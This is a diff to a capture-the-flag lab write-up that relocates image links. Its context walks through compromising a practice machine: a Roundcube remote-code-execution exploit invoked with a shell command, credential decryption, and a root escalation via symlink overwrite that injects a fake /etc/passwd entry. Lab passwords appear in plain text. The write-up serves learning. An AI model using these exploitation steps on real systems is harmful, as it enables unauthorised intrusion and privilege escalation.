@@ -9,13 +9,13 @@ Password: LhKL1o9Nm3X2
 ```shell
 nmap -sC -sV 10.10.11.77
 ```
-![Pasted image 20250803133504](Pasted%20image%2020250803133504.png)
+![Pasted image 20250803133504](Images/Pasted%20image%2020250803133504.png)
 
 -  There is the port `80` open which means we have a website 
-- I go to that website and I see that I am dealing with a `Roundcube Webmail` web application, where I am met with a login form and I use the given credentials to log in:![Pasted image 20250803133716](Pasted%20image%2020250803133716.png)
+- I go to that website and I see that I am dealing with a `Roundcube Webmail` web application, where I am met with a login form and I use the given credentials to log in:![Pasted image 20250803133716](Images/Pasted%20image%2020250803133716.png)
 
 - I am redirected to an `Inbox` page 
-- In the bottom left of this page There is a question mark(`?`) button, when clicked it pops an `About` prompt showing the version of the `Roundcube Webmail`![Pasted image 20250803134121](Pasted%20image%2020250803134121.png)
+- In the bottom left of this page There is a question mark(`?`) button, when clicked it pops an `About` prompt showing the version of the `Roundcube Webmail`![Pasted image 20250803134121](Images/Pasted%20image%2020250803134121.png)
 
 - On a quick search on google for a vulnerability for this version, I found what I need, that being the `CVE-2025-49113` Post-Authentication Remote Code Execution Vulnerability for versions `1.5.0` - `1.5.9` and `1.6.0` - `1.6.10` (perfect for the target exploitation)
 
@@ -29,7 +29,7 @@ php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "/bin/bash -c
 ```
 
 - I get a shell as the `www-data` user
-![Pasted image 20250804091752](Pasted%20image%2020250804091752.png)
+![Pasted image 20250804091752](Images/Pasted%20image%2020250804091752.png)
 
 - After some investigation I found a config file `config.inc.php` for `Roundcube` in the `/var/www/html/roundcube/config` directory 
 - In this file there are 2 very important things:
@@ -53,7 +53,7 @@ use roundcube;
 select * from session;
 ```
 
-- In this record I found an encoded session ![Pasted image 20250804094827](Pasted%20image%2020250804094827.png)
+- In this record I found an encoded session ![Pasted image 20250804094827](Images/Pasted%20image%2020250804094827.png)
 
 - I use [CyberChef](https://gchq.github.io/CyberChef/) to decode the Base64 output into readable text and I get the session:
 ```
@@ -62,28 +62,28 @@ language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:""
 
 - Here I found a username: `jacob` and his password which is encrypted: `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/`
 
-- Using the decryption key found earlier I try to decrypt the password and got as result: `595m08DmwGeD`![Pasted image 20250804095927](Pasted%20image%2020250804095927.png)
+- Using the decryption key found earlier I try to decrypt the password and got as result: `595m08DmwGeD`![Pasted image 20250804095927](Images/Pasted%20image%2020250804095927.png)
 
-- I fail to `ssh` with these credentials but I achieve to `su jacob` to gain privileges as `jacob` ![Pasted image 20250804100123](Pasted%20image%2020250804100123.png)
+- I fail to `ssh` with these credentials but I achieve to `su jacob` to gain privileges as `jacob` ![Pasted image 20250804100123](Images/Pasted%20image%2020250804100123.png)
 
-- Inspecting the home directory of `jacob` in the `/home/jacob/mail/INBOX` I found a file with the name `jacob` where I find a mail from `tyler` with credentials for `jacob` account![Pasted image 20250804100507](Pasted%20image%2020250804100507.png)
+- Inspecting the home directory of `jacob` in the `/home/jacob/mail/INBOX` I found a file with the name `jacob` where I find a mail from `tyler` with credentials for `jacob` account![Pasted image 20250804100507](Images/Pasted%20image%2020250804100507.png)
 
 - I `ssh` into `jacob` account using the password I found and also I got the user flag:
 ```shell
 ssh jacob@10.10.11.77
 Password: gY4Wr3a1evp4
 ```
-![Pasted image 20250804100702](Pasted%20image%2020250804100702.png)
+![Pasted image 20250804100702](Images/Pasted%20image%2020250804100702.png)
 
 ## Root Escalation
 
 - Also I check the what commands I can use with `sudo` using `sudo -l`:
-![Pasted image 20250804102809](Pasted%20image%2020250804102809.png)
+![Pasted image 20250804102809](Images/Pasted%20image%2020250804102809.png)
 - I find that I can use `sudo below`, I try to use that command but it does not help me much
 
 - In the mail, where I found the password, there were also another mail telling us that we have permission to go through logs
 - Going trough the `/var/log` directory I find a log directory named `below` the same as the command I can `sudo` cd below
-- One `below log file` owned by root has `666` permission which allows us to write it![Pasted image 20250804103259](Pasted%20image%2020250804103259.png)
+- One `below log file` owned by root has `666` permission which allows us to write it![Pasted image 20250804103259](Images/Pasted%20image%2020250804103259.png)
 
 - This opens the possibility for a `symlink exploit` 
 - With some help I found the following bash script to attempt the `symlink overwrite` to get a root shell using a fake entry we inject into `/etc/passwd` 
@@ -101,4 +101,4 @@ sudo below
 ```
 
 - After that we can use `su rot` and we get `root` privileges
-![Pasted image 20250804104543](Pasted%20image%2020250804104543.png)
+![Pasted image 20250804104543](Images/Pasted%20image%2020250804104543.png)
